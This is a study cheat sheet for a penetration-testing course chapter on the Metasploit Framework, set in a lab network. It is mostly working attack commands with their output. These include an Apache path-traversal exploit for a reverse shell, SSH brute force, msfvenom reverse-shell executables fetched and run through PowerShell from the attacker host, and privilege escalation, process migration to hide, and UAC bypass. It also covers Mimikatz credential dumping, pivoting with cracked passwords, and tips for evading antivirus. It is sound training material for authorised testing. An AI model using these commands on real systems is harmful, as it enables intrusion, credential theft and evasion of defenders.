# The Metasploit Framework Cheat Sheet (PEN-200, Ch. 21)

## Learning Units
1. Getting Familiar with Metasploit (setup, auxiliary modules, exploit modules)
2. Using Metasploit Payloads (staged/non-staged, Meterpreter, msfvenom)
3. Performing Post-Exploitation with Metasploit (core Meterpreter features, post modules, pivoting)
4. Automating Metasploit (resource scripts)

Metasploit Framework (MSF) — Rapid7's open-source "platform for developing, testing, and using exploit code." At the time of writing: **2200+ exploits, 1187+ auxiliary, 399+ post modules, 951+ payloads, 45 encoders, 11 nops, 9 evasion**. Modules follow a common slash-delimited hierarchy: `type/os,vendor,app,operation-or-protocol/module_name`.

---

## 21.1 Getting Familiar with Metasploit

### 21.1.1 Setting Up and Navigating Metasploit

MSF doesn't auto-start its database on Kali. Initialize it first:

```bash
sudo msfdb init                        # starts DB, creates msf/msf_test DB users+DBs, writes database.yml, initial schema
sudo systemctl enable postgresql       # enable DB service at boot
sudo msfconsole                        # launch the MSF console (-q flag hides banner/version)
```

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

Core command categories (from `help`): **Core Commands**, **Module Commands** (`search`, `show`, `use`), **Job Commands**, **Resource Script Commands**, **Database Backend Commands**, **Credentials Backend Commands**, **Developer Commands**.

**Workspaces** — isolate results per engagement so different assessments don't mix in the DB:

```
msf6 > workspace                 # list workspaces, * marks current
msf6 > workspace -a pen200       # create + switch to a new workspace named pen200
```

**Database Backend Commands** — `db_nmap` wraps Nmap with identical syntax and auto-logs results to the DB:

```
msf6 > db_nmap -A 192.168.50.202
msf6 > hosts                     # list all discovered hosts
msf6 > services                  # list all discovered services
msf6 > services -p 8000          # filter services by port
msf6 > vulns                     # list vulnerabilities MSF auto-flagged from module output
msf6 > creds                     # list all captured credentials
```

Other DB commands available: `loot`, `notes`, `vulns`, `workspace`.

**Module categories** — view with `show -h`:

```
msf6 > show -h
[*] Valid parameters for "show": all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
[*] Additional module-specific parameters: missing, advanced, evasion, targets, actions
```

Activate any module with `use <module_path>` or `use <search_index>`.

### 21.1.2 Auxiliary Modules

Auxiliary modules handle protocol enumeration, port scanning, fuzzing, sniffing, password attacks, etc. Key hierarchies: `gather/` (info gathering), `scanner/` (enumeration).

```
msf6 > show auxiliary                        # list all (very long)
msf6 > search type:auxiliary smb             # filter search by type + keyword
msf6 > use 56                                # activate by search-result index
msf6 auxiliary(scanner/smb/smb_version) > info
msf6 auxiliary(scanner/smb/smb_version) > show options    # shows Required column
msf6 auxiliary(scanner/smb/smb_version) > show missing    # required-but-unset options only
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
```

Feed DB results directly into a module option instead of setting manually:

```
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
msf6 auxiliary(scanner/smb/smb_version) > run
```

Example output confirmed SMB versions 2/3, preferred dialect SMB 3.1.1, and the run auto-populated the `vulns` table (e.g. "SMB Signing Is Not Required").

**SSH dictionary-attack example** (`ssh_login` — alternative to Hydra, and it opens a session on success):

```
msf6 > search type:auxiliary ssh
msf6 > use 15                                        # auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
msf6 auxiliary(scanner/ssh/ssh_login) > run
[+] 192.168.50.201:2222 - Success: 'george:chocolate' ...
[*] SSH session 1 opened ...
```

Other relevant SSH options seen: `PASSWORD`, `USER_FILE`, `USERPASS_FILE`, `USER_AS_PASS`, `STOP_ON_SUCCESS`, `THREADS`, `VERBOSE`.

> Unlike Hydra, Metasploit's `ssh_login` doesn't just report valid creds — it opens an interactive session automatically.

### 21.1.3 Exploit Modules

Exploit modules contain the actual exploit code (2200+ in MSF). Same interaction model as auxiliary modules.

```
msf6 > workspace -a exploits
msf6 > search Apache 2.4.49
msf6 > use 0                       # exploit/multi/http/apache_normalize_path_rce
msf6 exploit(multi/http/apache_normalize_path_rce) > info
```

`info` output to always review before running an exploit:
- **Platform / Arch** — target OS/architecture
- **Available targets** — e.g. `0 Automatic (Dropper)`, `1 Unix Command (In-Memory)` — if unsure, use `Automatic`
- **Check supported** — whether `check` can dry-run/verify vulnerability without exploiting
- **Description** — plain-text explanation of the vuln (here: CVE-2021-41773 / CVE-2021-42013, Apache path traversal → RCE via mod_cgi)

```
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
```

Module options: `CVE` (accepted values), `DEPTH`, `Proxies`, `RHOSTS`, `RPORT`, `SSL`, `TARGETURI`, `VHOST`.
Payload options (once a payload is set): `LHOST`, `LPORT`.

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options   # re-check LHOST auto-fill!
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.50.16
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

> **LHOST double-check**: Metasploit may auto-set LHOST, but on multi-interface Kali boxes it can pick the *wrong* interface — always verify with `show options` before `run`.

> **Default LPORT 4444 is a known IOC.** Real engagements often have 4444 blocked by firewalls/security tooling. Switching LPORT to a commonly-allowed port (80/443) can improve success odds.

Run output shows MSF: starts the listener → runs the module's built-in `check` (here `auxiliary/scanner/http/apache_normalize_path`) → confirms vulnerable → sends payload → opens a **Command shell session**. May print a cleanup warning (e.g. `This exploit may require manual cleanup of '/tmp/xxxx'`).

**Sessions & jobs:**

```
^Z                                   # background the current interactive session
Background session 2? [y/N] y

msf6 ...> sessions -l                # list active sessions
msf6 ...> sessions -i 2              # re-interact with a session
msf6 ...> sessions -k 2              # kill a session
msf6 ...> run -j                     # launch exploit as a background job instead of interactive
msf6 ...> jobs                       # list active jobs (e.g. listeners waiting for connections)
```

> Sessions/jobs matter because on a real engagement you'll juggle many compromised hosts — MSF tracks access centrally so you don't have to hunt for the right netcat terminal.

The payload chosen at exploit time determines what you get post-exploit — covered next.

---

## 21.2 Using Metasploit Payloads

### 21.2.1 Staged vs Non-Staged Payloads

- **Non-staged** ("all-in-one"): full exploit + shellcode sent together. More stable, but larger — can blow buffer-size constraints, and AV can more easily fingerprint the full shellcode.
- **Staged**: small first-stage payload connects back, pulls down a larger second-stage payload, then executes it. Smaller footprint (useful under space constraints) and can evade AV since the malicious second stage is injected directly into memory rather than shipped whole.

Naming convention: the **`/` separates stager from stage** — `payload/type/shell/reverse_tcp` = staged, `payload/type/shell_reverse_tcp` (underscore) = non-staged.

```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
...
15 payload/linux/x64/shell/reverse_tcp        Linux Command Shell, Reverse TCP Stager   <- staged
20 payload/linux/x64/shell_reverse_tcp        Linux Command Shell, Reverse             <- non-staged

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
msf6 exploit(multi/http/apache_normalize_path_rce) > run
...
[*] Sending stage (38 bytes) to 192.168.50.16
[*] Command shell session 3 opened ...
```
MSF reuses previously-set option values (LHOST/LPORT etc.) when you swap payloads.

### 21.2.2 Meterpreter Payload

Meterpreter = MSF's advanced, entirely in-memory, multi-function payload — dynamically extendable at runtime, hides its process, works cross-platform. Far richer than a raw command shell (which only gives you native OS commands).

```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
7  payload/linux/x64/meterpreter/bind_tcp             Linux Mettle x64, Bind TCP Stager        <- staged
8  payload/linux/x64/meterpreter/reverse_tcp          Linux Mettle x64, Reverse TCP Stager     <- staged
9  payload/linux/x64/meterpreter_reverse_http         Linux Meterpreter, Reverse HTTP Inline   <- non-staged
10 payload/linux/x64/meterpreter_reverse_https         Linux Meterpreter, Reverse HTTPS Inline  <- non-staged
11 payload/linux/x64/meterpreter_reverse_tcp           Linux Meterpreter, Reverse TCP Inline    <- non-staged

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

Once you land in `meterpreter >`, run `help` — commands are grouped: **Core Commands**, **Stdapi: System Commands**, **Networking Commands**, **File system Commands**.

```
meterpreter > sysinfo          # OS, arch, hostname
meterpreter > getuid           # current effective user
```

**Channels** — Meterpreter's mechanism for managing multiple concurrent interactive sub-shells within one session:

```
meterpreter > shell            # drop into a native command shell (creates a new channel)
^Z                              # background the channel
Background channel 1? [y/N] y
meterpreter > channel -l       # list active channels
meterpreter > channel -i 1     # interact with a specific channel
```

**File system commands** (prefix `l` = operate on local/Kali side):

| Command | Purpose |
|---|---|
| `cat` / `lcat` | read file contents (remote/local) |
| `cd` / `lcd` | change directory (remote/local) |
| `pwd` / `lpwd` | print working dir (remote/local) |
| `ls` / `lls` (`dir` = alias for `ls`) | list files |
| `download` / `upload` | transfer file or directory |
| `checksum` | retrieve file checksum |
| `chmod`, `cp`, `del`, `edit`, `mkdir`, `mv`, `rm`, `rmdir`, `search` | standard file ops |
| `getlwd` / `getwd` | print local/remote working dir |

```
meterpreter > lpwd
meterpreter > lcd /home/kali/Downloads
meterpreter > download /etc/passwd
meterpreter > lcat /home/kali/Downloads/passwd

meterpreter > upload /usr/bin/unix-privesc-check /tmp/
meterpreter > ls /tmp
```

> On Windows targets, remember to escape destination paths with `\\` when specifying upload/download targets.

**Meterpreter over HTTPS** — blends in as ordinary encrypted web traffic (defenders see only HTTPS requests to your Kali box, which 404s on direct browse):

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10   # linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
```
Notable option: `LURI` — optional path for the C2 endpoint (defaults to `/` if blank).

> Meterpreter is well-known to AV/EDR and has comparatively high detection rates. Prefer landing a raw TCP shell first, disable/bypass defenses, *then* deploy a Meterpreter shell.

### Generating Standalone Payloads with msfvenom

`msfvenom` is MSF's standalone payload generator for standalone artifacts (Windows/Linux binaries, webshells, scripts, etc.) with standardized CLI flags.

```bash
# list available payloads for a platform/arch
msfvenom -l payloads --platform windows --arch x64

# non-staged reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# staged reverse shell exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```
Flags: `-p` payload, `-f` output format (`exe`, etc.), `-o` output filename, `--platform`, `--arch`, `-l payloads` (list).

Deliver + execute (example via RDP session on a Windows box):
```powershell
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
.\nonstaged.exe
```
Catch a **non-staged** payload with a plain listener:
```bash
nc -nvlp 443
```

> A staged payload (e.g. `windows/x64/shell/reverse_tcp`) will connect to a raw `nc` listener, but **Netcat can't speak the staging protocol** — you'll get a connection with no interactive output. Staged (and other advanced payloads like Meterpreter) **require `multi/handler`**.

```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
[*] Sending stage (336 bytes) to 192.168.50.202
[*] Command shell session 6 opened ...
```

`run` (no args) blocks the console until the session ends/backgrounds. Use `run -j` to background the listener as a job immediately and keep working; `jobs` lists active listeners.

Uses for msfvenom-generated files: reverse-shell executables (exe/elf/PowerShell) for direct transfer-and-execute, web shells for web app exploitation, and payloads embedded in client-side attacks.

---

## 21.3 Performing Post-Exploitation with Metasploit

### 21.3.1 Core Meterpreter Post-Exploitation Features

Linux Meterpreter has fewer post-exploitation features than Windows Meterpreter — this section uses a Windows target.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```
Deliver via a Python3 web server + PowerShell `iwr`, execute `.\met.exe` from the existing bind-shell foothold → new Meterpreter session opens.

**idletime** — check first, before doing anything noisy:
```
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```
If the user is away, it's a safer window to run commands that might flash a visible CMD/PowerShell window.

**getsystem** — attempt automatic privilege escalation to SYSTEM using built-in techniques (token impersonation, named pipe impersonation, etc.):
```
C:\...> whoami /priv                       # confirm SeImpersonatePrivilege or similar is Enabled first
meterpreter > getuid
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**migrate** — move the running Meterpreter payload into a different process (protects against losing access if the host process dies; also hides a suspiciously-named process from defenders reviewing the process list):
```
meterpreter > ps                            # list processes, note target PID (e.g. legit user process like OneDrive.exe)
meterpreter > migrate 8052
meterpreter > getuid                        # note: now running as the context of the migrated-into process's owner
```
> You can only migrate into a process running at the **same or lower** integrity/privilege level than your current process.

> If `migrate` errors with `Error while running command migrate: undefined method 'pid' for nil`, update Metasploit to the latest version.

If no suitable process exists to migrate into, spawn one and migrate into that instead:
```
meterpreter > execute -H -f notepad          # -H = hidden (no visible window), -f = program to run
meterpreter > migrate 2720
```

Other notable Meterpreter post-exploitation features mentioned: `hashdump` (dump SAM database contents), `screenshare` (live view of target desktop).

### 21.3.2 Post-Exploitation Modules

Beyond native Meterpreter commands, MSF ships dedicated **post-exploitation modules** (`post/...`) for tasks like UAC bypass and client-side actions against an active session.

**UAC bypass example** — starting point: Meterpreter migrated into an admin user's process (e.g. `OneDrive.exe`) but still Medium integrity due to UAC.

Verify integrity level via PowerShell (`NtObjectManager` module):
```
meterpreter > shell
C:\...> powershell -ep bypass
PS> Import-Module NtObjectManager
PS> Get-NtTokenIntegrityLevel
Medium
```
Background and search for bypass modules:
```
^Z                          # background channel
meterpreter > bg            # background session
msf6 > search UAC
```
Effective option on modern Windows: `exploit/windows/local/bypassuac_sdclt` (abuses `sdclt.exe` to spawn a High-integrity process).
```
msf6 > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > show options       # SESSION, PAYLOAD_NAME, LHOST, LPORT
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run
```
Re-check integrity level in the new session — should now read `High`.

Setting `SESSION` on a post/local-exploit module runs it directly against an already-compromised session instead of against a fresh network target.

**Kiwi extension (Mimikatz)** — requires SYSTEM rights:
```
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > help                 # lists Kiwi Commands
meterpreter > creds_msv            # retrieve LM/NTLM creds (parsed)
```
Other Kiwi commands: `creds_all`, `creds_kerberos`, `creds_livessp`, `creds_ssp`, `creds_tspkg`, `creds_wdigest`, `dcsync`, `dcsync_ntlm`, `golden_ticket_create`, `kerberos_ticket_list`, `kerberos_ticket_purge`, `kerberos_ticket_use`, `kiwi_cmd` (run raw mimikatz command), `lsa_dump_sam`, `lsa_dump_secrets`, `password_change`, `wifi_list`, `wifi_list_shared`.

### 21.3.3 Pivoting with Metasploit

Automates the manual pivoting techniques from Port Redirection and Pivoting.

**1. Discover a second interface** on the compromised pivot host:
```
C:\...> ipconfig      # look for a second Ethernet adapter/subnet
```

**2. Add a route through the session:**
```
meterpreter > bg
msf6 > route add 172.16.5.0/24 12          # <network>/<cidr> <session id>
msf6 > route print
```

> Routes added this way **only work over already-established connections initiated from Kali** — so any new shell on the newly-reachable target must be a **bind shell** (e.g. `windows/x64/meterpreter/bind_tcp`), not a reverse shell, since the far-side target has no route back to your attacking network.

**3. Scan through the pivot:**
```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run
```

**4. Exploit the second target through the route** (e.g. cracked creds via psexec):
```
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
msf6 exploit(windows/smb/psexec) > run
```
(`luiza` must be a **local admin** on the second box for psexec to succeed.)

**Automatic routing** — `post/multi/manage/autoroute` sets up routes for you from an existing session (remove manual routes first with `route flush`):
```
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options    # CMD (add/autoadd/print/delete), SESSION, SUBNET, NETMASK
msf6 post(multi/manage/autoroute) > set SESSION 12
msf6 post(multi/manage/autoroute) > run
```

**SOCKS proxy for external tools** — tunnel non-MSF tools (e.g. `xfreerdp`) through the pivot via `proxychains`:
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j          # default listener port 1080
```
Update `/etc/proxychains4.conf` — add `socks5 127.0.0.1 1080` at the bottom (leave the rest of the file as-is).
```bash
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

**Port forwarding via Meterpreter** — alternative to SOCKS, forwards a single local port into the internal network:
```
meterpreter > portfwd -h
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
```
`portfwd` flags: `-i` (index to manage), `-l` (local port), `-L` (local host, optional), `-p` (remote port), `-r` (remote host), `-R` (reverse forward), `add|delete|list|flush`.
```bash
sudo xfreerdp /v:127.0.0.1 /u:luiza
```

---

## 21.4 Automating Metasploit

### 21.4.1 Resource Scripts

Resource scripts (`.rc` files) chain MSF console commands (and Ruby, since MSF itself is written in Ruby) to automate repetitive setup — e.g. spinning up listeners.

Example `listener.rc` — auto-configure a `multi/handler`, keep it alive across multiple incoming sessions, and auto-migrate on connect:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```
- `AutoRunScript` — a post module (or script) to auto-run against every new session created by this handler (here: auto-migrate to a new process).
- `ExitOnSession false` — keeps the listener running/accepting new connections after a session is created (rather than exiting after the first).
- `run -z -j` — run as a background job (`-j`) without auto-interacting with the resulting session (`-z`).

> Advanced module/payload options like `ExitOnSession` and `AutoRunScript` are discoverable via `show advanced` inside an activated module/payload.

Run MSF with the script preloaded:
```bash
sudo msfconsole -r listener.rc
```
Observed behavior on a real connection: MSF opens the session, runs `AutoRunScript` (`post/windows/manage/migrate`), spawns a new `notepad.exe`, migrates into it, all automatically — no manual `migrate` needed.

**Built-in resource scripts** ship under `scripts/resource/`:
```bash
ls -l /usr/share/metasploit-framework/scripts/resource
```
Examples seen: `auto_brute.rc`, `autocrawler.rc`, `auto_cred_checker.rc`, `autoexploit.rc`, `auto_pass_the_hash.rc`, `auto_win32_multihandler.rc`, `portscan.rc`, `run_all_post.rc`, `smb_checks.rc`, `smb_validate.rc`.

> Thoroughly review any resource script (built-in or third-party) before running it — like any script pulled from elsewhere, it can set options or run modules you didn't intend (e.g. against the wrong RHOSTS).

---

## Key Takeaways / Workflow Summary

1. **Setup once per box**: `sudo msfdb init` → `sudo systemctl enable postgresql` → `sudo msfconsole`. Create a `workspace -a <name>` per engagement to keep DB results separated.
2. **Recon into the DB**: `db_nmap` → `hosts` / `services` / `vulns` — feed these into module options (`services -p 445 --rhosts`) instead of typing IPs manually.
3. **Auxiliary modules** (`search type:auxiliary <keyword>`) for enumeration/scanning/brute force — `use <idx>` → `show options` / `show missing` → `set` → `run`. Results land in `vulns`/`creds` automatically.
4. **Exploit modules**: `search`, `info` (read Platform/Targets/Check supported/Description before running anything), `show options`, `set payload`, double-check auto-filled `LHOST`, consider changing `LPORT` off 4444 if firewalled, `run`.
5. **Payload choice matters**: staged (`type/action` with `/`) = smaller, better AV evasion, needs `multi/handler` to catch it. Non-staged (`type_action` with `_`) = bigger but self-contained, catchable with plain `nc`. Meterpreter = richest post-exploitation payload but highest AV/EDR detection — land a plain shell first if stealth matters.
6. **msfvenom** for standalone artifacts: `-p <payload> LHOST=.. LPORT=.. -f <fmt> -o <file>`; always pair staged/Meterpreter output with `multi/handler`, not netcat.
7. **Meterpreter workflow**: `sysinfo`/`getuid` → `idletime` → `getsystem` → `ps`/`migrate` (same-or-lower integrity only) → `load kiwi` for credential/ticket extraction once at SYSTEM.
8. **Post modules extend Meterpreter**: e.g. UAC bypass (`exploit/windows/local/bypassuac_sdclt`, set `SESSION`) to escalate Medium → High integrity.
9. **Pivoting**: `route add <subnet>/<cidr> <session>` (needs a bind shell on the second hop) or `post/multi/manage/autoroute` → scan through it (`auxiliary/scanner/portscan/tcp`) → exploit (`exploit/windows/smb/psexec` w/ bind payload) or tunnel external tools via `auxiliary/server/socks_proxy` + `proxychains`, or single-port `portfwd add -l <lport> -p <rport> -r <rhost>`.
10. **Automate repetitive setup** with resource scripts (`use` / `set` / `run -z -j`, `AutoRunScript`, `ExitOnSession false`) and launch with `msfconsole -r <script>.rc`. Review any script before trusting it.
